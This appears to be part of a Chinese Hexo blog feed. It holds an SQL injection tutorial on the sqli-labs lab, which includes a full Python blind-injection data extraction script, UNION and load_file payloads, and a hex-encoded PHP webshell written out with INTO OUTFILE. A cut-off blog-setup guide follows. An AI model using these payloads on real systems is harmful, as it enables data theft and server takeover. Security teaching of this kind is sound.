spellcheck="true">//127.0.0.1/sql1/Less-8/?id=1%27%20and%20if(ascii(substr((select%20database()),1,1))%3E115,1,0)%20%23返回错误，不大于115，即第一个字母的ascii为115，即字母s</span>http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1/sql1/Less-8/?id=1%27%20and%20if(ascii(substr((select%20database()),1,1))%3E110,1,0)%20%23</span>http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1/sql1/Less-8/?id=1%27%20and%20if(ascii(substr((select%20database()),1,1))%3E111,1,0)%20%23</span>http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1/sql1/Less-8/?id=1%27%20and%20if(ascii(substr((select%20database()),1,1))%3E114,1,0)%20%23返回正确，大于114</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>盲注过程是漫长的，一般是自己写脚本或使用工具辅助</p><p>写脚本之前要知道原理，上面的就是原理</p><p>下面基于这个学着写了个提取users表数据的完整脚本，大家可以参考下，当然如果大家用sqlmap也可以</p><h4 id="Python编写exp"><a href="#Python编写exp" class="headerlink" title="Python编写exp"></a>Python编写exp</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token shell-comment comment">#!/usr/bin/env python</span><span class="token shell-comment comment"># -*- coding: utf-8 -*-</span><span class="token shell-comment comment"># Date: 2020/06/16</span><span class="token shell-comment comment"># Created by Shadow</span>import urllib2import urllibsuccess_str <span class="token operator">=</span> <span class="token string">"You are in"</span>getTable <span class="token operator">=</span> <span class="token string">"users"</span>index <span class="token operator">=</span> <span class="token string">"0"</span>url <span class="token operator">=</span> "http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//1.1.1.130:86/Less-8/?id=1"</span>database <span class="token operator">=</span> <span class="token string">"database()"</span>selectDB <span class="token operator">=</span> <span class="token string">"select database()"</span>selectTable <span class="token operator">=</span> <span class="token string">"select table_name from information_schema.tables where table_schema='%s' limit %d,1"</span>asciiPayload <span class="token operator">=</span> <span class="token string">"' and ascii(substr((%s),%d,1))>=%d #"</span>lengthPayload <span class="token operator">=</span> <span class="token string">"' and length(%s)>=%d #"</span>selectTableCountPayload <span class="token operator">=</span> <span class="token string">"'and (select count(table_name) from information_schema.tables where table_schema='%s')>=%d #"</span>selectTableNameLengthPayloadfront <span class="token operator">=</span> <span class="token string">"'and (select length(table_name) from information_schema.tables where table_schema='%s' limit "</span>selectTableNameLengthPayloadbehind <span class="token operator">=</span> <span class="token string">",1)>=%d #"</span><span class="token shell-comment comment"># 发送请求，根据页面的返回的判断长度的猜测结果</span><span class="token shell-comment comment"># string:猜测的字符串    payload:使用的payload    length：猜测的长度</span>def <span class="token function">getLengthResult</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> string<span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">:</span>    finalUrl <span class="token operator">=</span> url <span class="token operator">+</span> urllib<span class="token punctuation">.</span><span class="token function">quote</span><span class="token punctuation">(</span>payload <span class="token operator">%</span> <span class="token punctuation">(</span>string<span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> urllib2<span class="token punctuation">.</span><span class="token function">urlopen</span><span class="token punctuation">(</span>finalUrl<span class="token punctuation">)</span>    <span class="token keyword">if</span> success_str in res<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> True    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> False<span class="token shell-comment comment"># 发送请求，根据页面的返回的判断猜测的字符是否正确</span><span class="token shell-comment comment"># payload:使用的payload    string:猜测的字符串    pos：猜测字符串的位置    ascii：猜测的ascii</span>def <span class="token function">getResult</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> string<span class="token punctuation">,</span> pos<span class="token punctuation">,</span> ascii<span class="token punctuation">)</span><span class="token punctuation">:</span>    finalUrl <span class="token operator">=</span> url <span class="token operator">+</span> urllib<span class="token punctuation">.</span><span class="token function">quote</span><span class="token punctuation">(</span>payload <span class="token operator">%</span> <span class="token punctuation">(</span>string<span class="token punctuation">,</span> pos<span class="token punctuation">,</span> ascii<span class="token punctuation">)</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> urllib2<span class="token punctuation">.</span><span class="token function">urlopen</span><span class="token punctuation">(</span>finalUrl<span class="token punctuation">)</span>    <span class="token keyword">if</span> success_str in res<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> True    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> False<span class="token shell-comment comment"># 注入</span>def <span class="token function">inject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token shell-comment comment"># 猜数据库长度</span>    lengthOfDBName <span class="token operator">=</span> <span class="token function">getLengthOfString</span><span class="token punctuation">(</span>lengthPayload<span class="token punctuation">,</span> database<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"length of DBname: "</span> <span class="token operator">+</span> <span class="token function">str</span><span class="token punctuation">(</span>lengthOfDBName<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token shell-comment comment"># 获取数据库名称</span>    DBname <span class="token operator">=</span> <span class="token function">getName</span><span class="token punctuation">(</span>asciiPayload<span class="token punctuation">,</span> selectDB<span class="token punctuation">,</span> lengthOfDBName<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"current database:"</span> <span class="token operator">+</span> DBname<span class="token punctuation">)</span>    <span class="token shell-comment comment"># 获取数据库中的表的个数</span>    <span class="token shell-comment comment"># print selectTableCountPayload</span>    tableCount <span class="token operator">=</span> <span class="token function">getLengthOfString</span><span class="token punctuation">(</span>selectTableCountPayload<span class="token punctuation">,</span> DBname<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"count of talbe:"</span> <span class="token operator">+</span> <span class="token function">str</span><span class="token punctuation">(</span>tableCount<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token shell-comment comment"># 获取数据库中的表</span>    <span class="token keyword">for</span> i in <span class="token function">xrange</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> tableCount<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token shell-comment comment"># 第几个表</span>        num <span class="token operator">=</span> <span class="token function">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        <span class="token shell-comment comment"># 获取当前这个表的长度</span>        selectTableNameLengthPayload <span class="token operator">=</span> selectTableNameLengthPayloadfront <span class="token operator">+</span> num <span class="token operator">+</span> selectTableNameLengthPayloadbehind        tableNameLength <span class="token operator">=</span> <span class="token function">getLengthOfString</span><span class="token punctuation">(</span>selectTableNameLengthPayload<span class="token punctuation">,</span> DBname<span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"current table length:"</span> <span class="token operator">+</span> <span class="token function">str</span><span class="token punctuation">(</span>tableNameLength<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token shell-comment comment"># 获取当前这个表的名字</span>        selectTableName <span class="token operator">=</span> selectTable <span class="token operator">%</span> <span class="token punctuation">(</span>DBname<span class="token punctuation">,</span> i<span class="token punctuation">)</span>        tableName <span class="token operator">=</span> <span class="token function">getName</span><span class="token punctuation">(</span>asciiPayload<span class="token punctuation">,</span> selectTableName<span class="token punctuation">,</span> tableNameLength<span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token punctuation">(</span>tableName<span class="token punctuation">)</span>    selectColumnCountPayload <span class="token operator">=</span> <span class="token string">"'and (select count(column_name) from information_schema.columns where table_schema='"</span> <span class="token operator">+</span> DBname <span class="token operator">+</span> <span class="token string">"' and table_name='%s')>=%d #"</span>    <span class="token shell-comment comment"># print selectColumnCountPayload</span>    <span class="token shell-comment comment"># 获取指定表的列的数量</span>    columnCount <span class="token operator">=</span> <span class="token function">getLengthOfString</span><span class="token punctuation">(</span>selectColumnCountPayload<span class="token punctuation">,</span> getTable<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"table:"</span> <span class="token operator">+</span> getTable <span class="token operator">+</span> <span class="token string">" --count of column:"</span> <span class="token operator">+</span> <span class="token function">str</span><span class="token punctuation">(</span>columnCount<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token shell-comment comment"># 获取该表有多少行数据</span>    dataCountPayload <span class="token operator">=</span> <span class="token string">"'and (select count(*) from %s)>=%d #"</span>    dataCount <span class="token operator">=</span> <span class="token function">getLengthOfString</span><span class="token punctuation">(</span>dataCountPayload<span class="token punctuation">,</span> getTable<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"table:"</span> <span class="token operator">+</span> getTable <span class="token operator">+</span> <span class="token string">" --count of data: "</span> <span class="token operator">+</span> <span class="token function">str</span><span class="token punctuation">(</span>dataCount<span class="token punctuation">)</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token shell-comment comment"># 获取指定表中的列</span>    <span class="token keyword">for</span> i in <span class="token function">xrange</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> columnCount<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token shell-comment comment"># 获取该列名字长度</span>        selectColumnNameLengthPayload <span class="token operator">=</span> <span class="token string">"'and (select length(column_name) from information_schema.columns where table_schema='"</span> <span class="token operator">+</span> DBname <span class="token operator">+</span> <span class="token string">"' and table_name='%s' limit "</span> <span class="token operator">+</span> <span class="token function">str</span><span class="token punctuation">(</span>            i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",1)>=%d #"</span>        <span class="token shell-comment comment"># print selectColumnNameLengthPayload</span>        columnNameLength <span class="token operator">=</span> <span class="token function">getLengthOfString</span><span class="token punctuation">(</span>selectColumnNameLengthPayload<span class="token punctuation">,</span> getTable<span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"current column length:"</span> <span class="token operator">+</span> <span class="token function">str</span><span class="token punctuation">(</span>columnNameLength<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token shell-comment comment"># 获取该列的名字</span>        selectColumn <span class="token operator">=</span> <span class="token string">"select column_name from information_schema.columns where table_schema='"</span> <span class="token operator">+</span> DBname <span class="token operator">+</span> <span class="token string">"' and table_name='%s' limit %d,1"</span>        selectColumnName <span class="token operator">=</span> selectColumn <span class="token operator">%</span> <span class="token punctuation">(</span>getTable<span class="token punctuation">,</span> i<span class="token punctuation">)</span>        <span class="token shell-comment comment"># print selectColumnName</span>        columnName <span class="token operator">=</span> <span class="token function">getName</span><span class="token punctuation">(</span>asciiPayload<span class="token punctuation">,</span> selectColumnName<span class="token punctuation">,</span> columnNameLength<span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token punctuation">(</span>columnName<span class="token punctuation">)</span>        tmpData <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        tmpData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>columnName<span class="token punctuation">)</span>        <span class="token shell-comment comment"># 获取该表的数据</span>        <span class="token keyword">for</span> j in <span class="token function">xrange</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> dataCount<span class="token punctuation">)</span><span class="token punctuation">:</span>            columnDataLengthPayload <span class="token operator">=</span> <span class="token string">"'and (select length("</span> <span class="token operator">+</span> columnName <span class="token operator">+</span> <span class="token string">") from %s limit "</span> <span class="token operator">+</span> <span class="token function">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",1)>=%d #"</span>            <span class="token shell-comment comment"># print columnDataLengthPayload</span>            columnDataLength <span class="token operator">=</span> <span class="token function">getLengthOfString</span><span class="token punctuation">(</span>columnDataLengthPayload<span class="token punctuation">,</span> getTable<span class="token punctuation">)</span>            <span class="token shell-comment comment"># print columnDataLength</span>            selectData <span class="token operator">=</span> <span class="token string">"select "</span> <span class="token operator">+</span> columnName <span class="token operator">+</span> <span class="token string">" from users limit "</span> <span class="token operator">+</span> <span class="token function">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">",1"</span>            columnData <span class="token operator">=</span> <span class="token function">getName</span><span class="token punctuation">(</span>asciiPayload<span class="token punctuation">,</span> selectData<span class="token punctuation">,</span> columnDataLength<span class="token punctuation">)</span>            <span class="token shell-comment comment"># print columnData</span>            tmpData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>columnData<span class="token punctuation">)</span>        data<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>tmpData<span class="token punctuation">)</span>    <span class="token shell-comment comment"># print data</span>    <span class="token shell-comment comment"># 格式化输出数据</span>    <span class="token shell-comment comment"># 输出列名</span>    tmp <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i in <span class="token function">xrange</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp <span class="token operator">+</span><span class="token operator">=</span> data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"    "</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>    <span class="token shell-comment comment"># 输出具体数据</span>    <span class="token keyword">for</span> j in <span class="token function">xrange</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> dataCount <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp <span class="token operator">=</span> <span class="token string">""</span>        <span class="token keyword">for</span> i in <span class="token function">xrange</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            tmp <span class="token operator">+</span><span class="token operator">=</span> data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"    "</span>        <span class="token keyword">print</span> <span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token shell-comment comment"># 获取字符串的长度</span>def <span class="token function">getLengthOfString</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> string<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token shell-comment comment"># 猜长度</span>    lengthLeft <span class="token operator">=</span> <span class="token number">0</span>    lengthRigth <span class="token operator">=</span> <span class="token number">0</span>    guess <span class="token operator">=</span> <span class="token number">10</span>    <span class="token shell-comment comment"># 确定长度上限，每次增加5</span>    <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token shell-comment comment"># 如果长度大于guess</span>        <span class="token keyword">if</span> <span class="token function">getLengthResult</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> string<span class="token punctuation">,</span> guess<span class="token punctuation">)</span> <span class="token operator">==</span> True<span class="token punctuation">:</span>            <span class="token shell-comment comment"># 猜测值增加5</span>            guess <span class="token operator">=</span> guess <span class="token operator">+</span> <span class="token number">5</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            lengthRigth <span class="token operator">=</span> guess            <span class="token keyword">break</span>    <span class="token shell-comment comment"># print </span><span class="token string">"lengthRigth: "</span> <span class="token operator">+</span> <span class="token function">str</span><span class="token punctuation">(</span>lengthRigth<span class="token punctuation">)</span>    <span class="token shell-comment comment"># 二分法查长度</span>    mid <span class="token operator">=</span> <span class="token punctuation">(</span>lengthLeft <span class="token operator">+</span> lengthRigth<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span>    <span class="token keyword">while</span> lengthLeft <span class="token operator">&lt;</span> lengthRigth <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token shell-comment comment"># 如果长度大于等于mid</span>        <span class="token keyword">if</span> <span class="token function">getLengthResult</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> string<span class="token punctuation">,</span> mid<span class="token punctuation">)</span> <span class="token operator">==</span> True<span class="token punctuation">:</span>            <span class="token shell-comment comment"># 更新长度的左边界为mid</span>            lengthLeft <span class="token operator">=</span> mid        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token shell-comment comment"># 否则就是长度小于mid</span>            <span class="token shell-comment comment"># 更新长度的右边界为mid</span>            lengthRigth <span class="token operator">=</span> mid        <span class="token shell-comment comment"># 更新中值</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>lengthLeft <span class="token operator">+</span> lengthRigth<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span>        <span class="token shell-comment comment"># print lengthLeft, lengthRigth</span>    <span class="token shell-comment comment"># 因为lengthLeft当长度大于等于mid时更新为mid，而lengthRigth是当长度小于mid时更新为mid</span>    <span class="token shell-comment comment"># 所以长度区间：大于等于 lengthLeft，小于lengthRigth</span>    <span class="token shell-comment comment"># 而循环条件是 lengthLeft &lt; lengthRigth - 1，退出循环，lengthLeft就是所求长度</span>    <span class="token shell-comment comment"># 如循环到最后一步 lengthLeft = 8， lengthRigth = 9时，循环退出，区间为8&lt;=length&lt;9,length就肯定等于8</span>    <span class="token keyword">return</span> lengthLeft<span class="token shell-comment comment"># 获取名称</span>def <span class="token function">getName</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> string<span class="token punctuation">,</span> lengthOfString<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token shell-comment comment"># 32是空格，是第一个可显示的字符，127是delete，最后一个字符</span>    tmp <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i in <span class="token function">xrange</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> lengthOfString <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        left <span class="token operator">=</span> <span class="token number">32</span>        right <span class="token operator">=</span> <span class="token number">127</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span>        <span class="token keyword">while</span> left <span class="token operator">&lt;</span> right <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">:</span>            <span class="token shell-comment comment"># 如果该字符串的第i个字符的ascii码大于等于mid</span>            <span class="token keyword">if</span> <span class="token function">getResult</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> string<span class="token punctuation">,</span> i<span class="token punctuation">,</span> mid<span class="token punctuation">)</span> <span class="token operator">==</span> True<span class="token punctuation">:</span>                <span class="token shell-comment comment"># 则更新左边界</span>                left <span class="token operator">=</span> mid                mid <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token shell-comment comment"># 否则该字符串的第i个字符的ascii码小于mid</span>                <span class="token shell-comment comment"># 则更新右边界</span>                right <span class="token operator">=</span> mid            <span class="token shell-comment comment"># 更新中值</span>            mid <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span>        tmp <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span>        <span class="token shell-comment comment"># print tmp</span>    <span class="token keyword">return</span> tmpdef <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token function">inject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="注入的利用方式"><a href="#注入的利用方式" class="headerlink" title="注入的利用方式"></a>注入的利用方式</h3><h4 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h4><p>判断完列长度后，我们就用union联合查询来爆敏感信息：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">3</span>'union select @@datadir<span class="token punctuation">,</span><span class="token function">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201124150224406.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h4 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h4><p>这里我们写一个一句话进去，这个一句话写的时候最好十六进制编码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token number">0x3C3F70687020406576616C5B245F504F53545B2761275D5D3B3F3E</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>payload：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select 1,'</span><span class="token number">0x3C3F70687020406576616C28245F504F53545B315D293F3E</span>'<span class="token punctuation">,</span><span class="token number">3</span> into outfile <span class="token string">"C:/phpstudy_pro/WWW/A_testCode/sql/1.php"</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201124165253222.png#pic_center" alt="在这里插入图片描述"><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201124165321218.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>菜刀连接：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201124165639838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>再来读一下文件：</p><p>payload：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select 1,2,load_file('</span>C<span class="token punctuation">:</span><span class="token operator">/</span>phpstudy_pro<span class="token operator">/</span><span class="token constant">WWW</span><span class="token operator">/</span>A_testCode<span class="token operator">/</span>sql<span class="token operator">/</span>login<span class="token punctuation">.</span>html'<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201125095340587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p><strong>仅限linux环境下</strong></p><pre class="line-numbers language-php"><code class="language-php">system 系统命令<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><ul><li>使用预编译语句</li><li>使用存储过程</li><li>检查函数类型</li><li>使用安全函数</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 代码审计篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>个人博客搭建</title>
      <link href="/posts/e3e08109.html"/>
      <url>/posts/e3e08109.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x001-效果演示"><a href="#0x001-效果演示" class="headerlink" title="0x001 效果演示"></a>0x001 效果演示</h2><hr><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://s2.ax1x.com/2020/03/11/8E3bBF.png" alt="演示Demo"></p><h2 id="0x002-简单介绍"><a href="#0x002-简单介绍" class="headerlink" title="0x002 简单介绍"></a>0x002 简单介绍</h2><hr><p>  前前后后大概花了一周多的时间，目前个人博客已经完善的差不多了，现在写个文章做个阶段总结，后续如果有更新的地方，会及时补充。本博客基于Hexo框架，采用<a href="https://github.com/blinkfox/hexo-theme-matery/blob/develop/README_CN.md" target="_blank" rel="noopener">hexo-theme-matery</a>主题，在这里非常感谢作者<code>洪卫</code>的<a href="https://github.com/shw2018/hexo-blog-fly.git" target="_blank" rel="noopener">hexo-blog-fly</a>博客开源，极大简化了构建博客的工作量和复杂度。在此开源博客的基础上做了改进，修复了一些bug，顺利搭建完成了我的个人博客。大家对此主题有兴趣的可以<a href="https://github.com/shw2018/hexo-blog-fly" target="_blank" rel="noopener">下载源代码</a>，搭建属于自己的个性化博客。</p><ul><li>个人博客 演示：<a href="http://luckyzmj.cn" target="_blank" rel="noopener">http://luckyzmj.cn</a></li></ul><hr><h2 id="0x003-Hexo-初级搭建"><a href="#0x003-Hexo-初级搭建" class="headerlink" title="0x003 Hexo 初级搭建"></a>0x003 Hexo 初级搭建</h2><hr><h3 id="1-安装Git"><a href="#1-安装Git" class="headerlink" title="1. 安装Git"></a>1. 安装Git</h3><p><code>Git</code>是目前世界上最先进的分布式版本控制系统，可以有效、高速的处理从很小到非常大的项目版本管理。<code>Git</code>的作用是将本地的网页文件传到<code>github</code>上。</p><ul><li>Git<a href="https://git-scm.com/download" target="_blank" rel="noopener">下载地址</a></li><li>Git<a href="https://www.liaoxuefeng.com/wiki/896043488029600" target="_blank" rel="noopener">教程</a></li></ul><p><strong>windows：</strong> 到git官网上下载.exe文件,Download git,安装选项还是全部默认，最后一步添加路径时选择<code>Use Git from the Windows Command Prompt</code>。</p><h3 id="2-安装node-js"><a href="#2-安装node-js" class="headerlink" title="2. 安装node.js"></a>2. 安装node.js</h3><p><code>Hexo</code>是基于<code>node.js</code>编写的，所以需要安装一下<code>node.js</code>和里面的<code>npm</code>工具。</p><p><strong>windows：</strong> 到<a href="http://nodejs.cn/download/" target="_blank" 